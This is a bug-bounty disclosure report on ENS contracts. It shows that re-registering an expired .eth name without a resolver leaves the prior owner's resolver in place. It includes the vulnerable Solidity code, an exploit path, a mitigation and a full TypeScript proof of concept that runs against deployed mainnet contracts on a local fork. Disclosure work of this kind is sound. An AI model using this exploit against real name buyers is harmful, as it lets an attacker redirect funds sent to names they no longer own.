# Expired .eth re-registration without a resolver preserves attacker-controlled resolution records

Severity: Critical

Bounty Criteria Match: critical (smart contract): Unintended alteration of what the NFT represents (e.g. token URI, payload, artistic content)

Affected Contracts:
- [`ETHRegistrarController.register`](https://github.com/ensdomains/ens-contracts/blob/91c966febd7b55494269df830fc6775f040b927b/contracts/ethregistrar/ETHRegistrarController.sol#L247-L331)
- [`BaseRegistrarImplementation._register`](https://github.com/ensdomains/ens-contracts/blob/91c966febd7b55494269df830fc6775f040b927b/contracts/ethregistrar/BaseRegistrarImplementation.sol#L130-L150)
- [`ENSRegistry.setSubnodeOwner`](https://github.com/ensdomains/ens-contracts/blob/91c966febd7b55494269df830fc6775f040b927b/contracts/registry/ENSRegistry.sol#L75-L94)

# Finding Description and Impact

When an expired `.eth` name is re-registered without a resolver, ownership moves to the new buyer but the registry resolver remains the previous owner's resolver. Because ENS name resolution uses that resolver as the live payload for the name, the prior owner can continue altering what the newly owned name resolves to.

- Registering with `resolver == address(0)` is an explicit supported controller path when no resolver data or reverse record is supplied.
- The no-resolver registration branch updates only registrar/registry ownership.
- The resolver-setting branch is the only branch that calls `ens.setRecord` and overwrites resolver state.
- `ENSRegistry.setSubnodeOwner` changes only owner state, leaving resolver and TTL untouched.

The vulnerable controller branch skips resolver reset when `registration.resolver == address(0)`:

```solidity
if (registration.resolver == address(0)) {
    expires = base.register(
        uint256(labelhash),
        registration.owner,
        registration.duration
    );
} else {
    expires = base.register(
        uint256(labelhash),
        address(this),
        registration.duration
    );

    bytes32 namehash = keccak256(abi.encodePacked(ETH_NODE, labelhash));
    ens.setRecord(
        namehash,
        registration.owner,
        registration.resolver,
        0
    );
```

The registry owner update invoked by the registrar does not clear the resolver:

```solidity
function setSubnodeOwner(
    bytes32 node,
    bytes32 label,
    address owner
) public virtual override authorised(node) returns (bytes32) {
    bytes32 subnode = keccak256(abi.encodePacked(node, label));
    _setOwner(subnode, owner);
    emit NewOwner(node, label, owner);
    return subnode;
}
```

### **Exploit Path**

1. Attacker registers a `.eth` name with an attacker-controlled resolver and sets address records.
2. The name expires and passes the grace period, making it available again.
3. A victim re-registers the same name without specifying a resolver.
4. `base.register` transfers ERC721 and registry ownership to the victim.
5. The stale resolver remains the attacker-controlled resolver, so the attacker continues changing resolved records.

### **Impact**

- The new owner's ENS NFT/name can resolve to attacker-chosen addresses or records.
- ENS-aware wallets/apps sending funds to the newly owned name can resolve the name to the prior owner's attacker-controlled address.
- Users and integrations relying on the name can be directed to attacker-controlled destinations.
- The impact matches Critical because the active resolver payload for the NFT/name remains unintentionally altered after ownership transfer.

### **Recommended Mitigation Steps**

Always clear or replace resolver state during registration of an expired name. In the no-resolver branch, call `ens.setRecord(namehash, registration.owner, address(0), 0)` or otherwise ensure resolver and TTL are reset atomically with ownership transfer. Add regression coverage for expired re-registration with and without resolver/data.

## Proof of Concept

Save as: test/ExpiredNameNoResolverReRegistrationPoC.test.ts

Run: MAINNET_RPC_URL=<mainnet rpc url> bun run test test/ExpiredNameNoResolverReRegistrationPoC.test.ts

This PoC starts an Anvil fork from Ethereum mainnet, uses the deployed ENS Registry, BaseRegistrarImplementation, and ETHRegistrarController addresses, and does not mutate live protocol state.

```typescript
import hre from 'hardhat'
import { createAnvil } from '@viem/anvil'
import {
  type Address,
  type Hex,
  createPublicClient,
  createWalletClient,
  hexToBigInt,
  http,
  keccak256,
  labelhash,
  namehash,
  parseEther,
  toBytes,
  toHex,
  zeroHash,
} from 'viem'
import { privateKeyToAccount } from 'viem/accounts'
import { mainnet } from 'viem/chains'

// Fixed fork block keeps the PoC reproducible while still using deployed mainnet state.
const MAINNET_FORK_BLOCK = 25030187n
const REGISTRATION_DURATION = 28n * 24n * 60n * 60n
const GRACE_PERIOD = 90n * 24n * 60n * 60n
const PREMIUM_DECAY_PERIOD = 28n * 24n * 60n * 60n
const BASE_REGISTRAR = '0x57f1887a8BF19b14fC0dF6Fd9B2acc9Af147eA85'
const ETH_REGISTRAR_CONTROLLER =
  '0x59E16fcCd424Cc24e280Be16E11Bcd56fb0CE547'
const ENS_REGISTRY = '0x00000000000C2E074eC69A0dFb2997BA6C7d2e1e'

/**
 * Well-known deterministic Hardhat/Anvil dev keys.
 *
 * These are public test keys, funded only inside the local Anvil fork with
 * anvil_setBalance below. They are not secrets and must never be used on
 * mainnet or any funded network.
 */
const attacker = privateKeyToAccount(
  '0x59c6995e998f97a5a0044966f0945389d78589786e8b1a1a0c35a0a1a16cd363',
)
const victim = privateKeyToAccount(
  '0x5de4111acf9a1971b0b2b092737e3a3a2c88c7b0d1b2e5f1e8b7e7b2f60e8f1b',
)
const replacement = privateKeyToAccount(
  '0x7c852118294bbba4a69d92112efb3e1a2b1d5d973250f0e0999d3da9e2cb4565',
)

const controllerAbi = [
  {
    type: 'function',
    name: 'rentPrice',
    stateMutability: 'view',
    inputs: [
      { name: 'label', type: 'string' },
      { name: 'duration', type: 'uint256' },
    ],
    outputs: [
      {
        name: 'price',
        type: 'tuple',
        components: [
          { name: 'base', type: 'uint256' },
          { name: 'premium', type: 'uint256' },
        ],
      },
    ],
  },
  {
    type: 'function',
    name: 'available',
    stateMutability: 'view',
    inputs: [{ name: 'label', type: 'string' }],
    outputs: [{ name: '', type: 'bool' }],
  },
  {
    type: 'function',
    name: 'minCommitmentAge',
    stateMutability: 'view',
    inputs: [],
    outputs: [{ name: '', type: 'uint256' }],
  },
  {
    type: 'function',
    name: 'makeCommitment',
    stateMutability: 'pure',
    inputs: [
      {
        name: 'registration',
        type: 'tuple',
        components: [
          { name: 'label', type: 'string' },
          { name: 'owner', type: 'address' },
          { name: 'duration', type: 'uint256' },
          { name: 'secret', type: 'bytes32' },
          { name: 'resolver', type: 'address' },
          { name: 'data', type: 'bytes[]' },
          { name: 'reverseRecord', type: 'uint8' },
          { name: 'referrer', type: 'bytes32' },
        ],
      },
    ],
    outputs: [{ name: '', type: 'bytes32' }],
  },
  {
    type: 'function',
    name: 'commit',
    stateMutability: 'nonpayable',
    inputs: [{ name: 'commitment', type: 'bytes32' }],
    outputs: [],
  },
  {
    type: 'function',
    name: 'register',
    stateMutability: 'payable',
    inputs: [
      {
        name: 'registration',
        type: 'tuple',
        components: [
          { name: 'label', type: 'string' },
          { name: 'owner', type: 'address' },
          { name: 'duration', type: 'uint256' },
          { name: 'secret', type: 'bytes32' },
          { name: 'resolver', type: 'address' },
          { name: 'data', type: 'bytes[]' },
          { name: 'reverseRecord', type: 'uint8' },
          { name: 'referrer', type: 'bytes32' },
        ],
      },
    ],
    outputs: [],
  },
] as const

const baseRegistrarAbi = [
  {
    type: 'function',
    name: 'ownerOf',
    stateMutability: 'view',
    inputs: [{ name: 'tokenId', type: 'uint256' }],
    outputs: [{ name: '', type: 'address' }],
  },
] as const

const ensRegistryAbi = [
  {
    type: 'function',
    name: 'owner',
    stateMutability: 'view',
    inputs: [{ name: 'node', type: 'bytes32' }],
    outputs: [{ name: '', type: 'address' }],
  },
  {
    type: 'function',
    name: 'resolver',
    stateMutability: 'view',
    inputs: [{ name: 'node', type: 'bytes32' }],
    outputs: [{ name: '', type: 'address' }],
  },
] as const

const resolverAbi = [
  {
    type: 'function',
    name: 'setAddr',
    stateMutability: 'nonpayable',
    inputs: [
      { name: 'node', type: 'bytes32' },
      { name: 'addr', type: 'address' },
    ],
    outputs: [],
  },
  {
    type: 'function',
    name: 'addr',
    stateMutability: 'view',
    inputs: [{ name: 'node', type: 'bytes32' }],
    outputs: [{ name: '', type: 'address' }],
  },
] as const

type Registration = {
  label: string
  owner: Address
  duration: bigint
  secret: Hex
  resolver: Address
  data: Hex[]
  reverseRecord: number
  referrer: Hex
}

const rpcUrl = process.env.MAINNET_RPC_URL
const anvil = createAnvil({
  forkUrl: rpcUrl,
  forkBlockNumber: MAINNET_FORK_BLOCK,
  chainId: 1,
  port: 18546,
  startTimeout: 60_000,
})

const publicClient = createPublicClient({
  chain: mainnet,
  transport: http(`http://${anvil.host}:${anvil.port}`),
})
const attackerWallet = createWalletClient({
  account: attacker,
  chain: mainnet,
  transport: http(`http://${anvil.host}:${anvil.port}`),
})
const victimWallet = createWalletClient({
  account: victim,
  chain: mainnet,
  transport: http(`http://${anvil.host}:${anvil.port}`),
})

async function mineAt(timestamp: bigint) {
  await publicClient.request({
    method: 'evm_setNextBlockTimestamp',
    params: [Number(timestamp)],
  } as never)
  await publicClient.request({ method: 'evm_mine', params: [] } as never)
}

async function wait(hash: Hex) {
  await publicClient.waitForTransactionReceipt({ hash })
}

async function fund(address: Address) {
  // Give local fork actors ETH for gas/registrations without touching mainnet.
  await publicClient.request({
    method: 'anvil_setBalance',
    params: [address, toHex(parseEther('10000'))],
  } as never)
}

// Registers through the deployed mainnet ETHRegistrarController, including
// the real commit/reveal delay and rentPrice calculation.
async function registerName(
  label: string,
  owner: Address,
  resolver: Address,
  secretText: string,
  accountWallet: typeof attackerWallet,
) {
  const registration: Registration = {
    label,
    owner,
    duration: REGISTRATION_DURATION,
    secret: keccak256(toBytes(secretText)),
    resolver,
    data: [],
    reverseRecord: 0,
    referrer: zeroHash,
  }
  const commitment = await publicClient.readContract({
    address: ETH_REGISTRAR_CONTROLLER,
    abi: controllerAbi,
    functionName: 'makeCommitment',
    args: [registration],
  })
  await wait(
    await accountWallet.writeContract({
      address: ETH_REGISTRAR_CONTROLLER,
      abi: controllerAbi,
      functionName: 'commit',
      args: [commitment],
    }),
  )

  const minCommitmentAge = await publicClient.readContract({
    address: ETH_REGISTRAR_CONTROLLER,
    abi: controllerAbi,
    functionName: 'minCommitmentAge',
  })
  const latestBlock = await publicClient.getBlock()
  await mineAt(latestBlock.timestamp + minCommitmentAge + 1n)

  const price = await publicClient.readContract({
    address: ETH_REGISTRAR_CONTROLLER,
    abi: controllerAbi,
    functionName: 'rentPrice',
    args: [label, REGISTRATION_DURATION],
  })
  await wait(
    await accountWallet.writeContract({
      address: ETH_REGISTRAR_CONTROLLER,
      abi: controllerAbi,
      functionName: 'register',
      args: [registration],
      value: price.base + price.premium,
    }),
  )
}

beforeAll(async () => {
  if (!rpcUrl) throw new Error('Set MAINNET_RPC_URL to run this fork PoC')
  // Start an isolated Ethereum mainnet fork. All writes below happen locally.
  await anvil.start()
  await fund(attacker.address)
  await fund(victim.address)
  await fund(replacement.address)
}, 90_000)

afterAll(async () => {
  await anvil.stop()
})

describe('ExpiredNameNoResolverReRegistrationPoC', () => {
  it('uses mainnet ENS contracts to show no-resolver re-registration keeps the old resolver', async () => {
    const label = 'staleresolverpocfork'
    const tokenId = hexToBigInt(labelhash(label))
    const node = namehash(`${label}.eth`)

    // A real user can deploy their own resolver; this is not a protocol mock.
    const resolverArtifact = await hre.artifacts.readArtifact('OwnedResolver')
    const deployHash = await attackerWallet.deployContract({
      abi: resolverArtifact.abi,
      bytecode: resolverArtifact.bytecode as Hex,
    })
    const deployReceipt = await publicClient.waitForTransactionReceipt({
      hash: deployHash,
    })
    const attackerResolver = deployReceipt.contractAddress!

    // The attacker uses a valid self-owned resolver when registering the name.
    await registerName(
      label,
      attacker.address,
      attackerResolver,
      'attacker-registration-secret',
      attackerWallet,
    )
    await wait(
      await attackerWallet.writeContract({
        address: attackerResolver,
        abi: resolverAbi,
        functionName: 'setAddr',
        args: [node, attacker.address],
      }),
    )

    // Move past expiry, grace period, and premium decay so the same name is
    // normally available for a later buyer to re-register.
    const expiryBlock = await publicClient.getBlock()
    await mineAt(
      expiryBlock.timestamp +
        REGISTRATION_DURATION +
        GRACE_PERIOD +
        PREMIUM_DECAY_PERIOD +
        2n,
    )
    expect(
      await publicClient.readContract({
        address: ETH_REGISTRAR_CONTROLLER,
        abi: controllerAbi,
        functionName: 'available',
        args: [label],
      }),
    ).toBe(true)

    // A later buyer uses the supported no-resolver registration path.
    await registerName(
      label,
      victim.address,
      '0x0000000000000000000000000000000000000000',
      'victim-registration-secret',
      victimWallet,
    )

    expect(
      (
        await publicClient.readContract({
          address: BASE_REGISTRAR,
          abi: baseRegistrarAbi,
          functionName: 'ownerOf',
          args: [tokenId],
        })
      ).toLowerCase(),
    ).toBe(victim.address.toLowerCase())
    expect(
      (
        await publicClient.readContract({
          address: ENS_REGISTRY,
          abi: ensRegistryAbi,
          functionName: 'owner',
          args: [node],
        })
      ).toLowerCase(),
    ).toBe(victim.address.toLowerCase())
    expect(
      (
        await publicClient.readContract({
          address: ENS_REGISTRY,
          abi: ensRegistryAbi,
          functionName: 'resolver',
          args: [node],
        })
      ).toLowerCase(),
    ).toBe(attackerResolver.toLowerCase())

    // The victim owns the name, but the stale resolver is still controlled by
    // the prior owner, so the victim cannot update records through it.
    await expect(
      victimWallet.writeContract({
        address: attackerResolver,
        abi: resolverAbi,
        functionName: 'setAddr',
        args: [node, victim.address],
      }),
    ).rejects.toThrow()

    // The prior owner can still mutate the live resolution payload.
    await wait(
      await attackerWallet.writeContract({
        address: attackerResolver,
        abi: resolverAbi,
        functionName: 'setAddr',
        args: [node, replacement.address],
      }),
    )
    expect(
      (
        await publicClient.readContract({
          address: attackerResolver,
          abi: resolverAbi,
          functionName: 'addr',
          args: [node],
        })
      ).toLowerCase(),
    ).toBe(replacement.address.toLowerCase())
  })
})
```
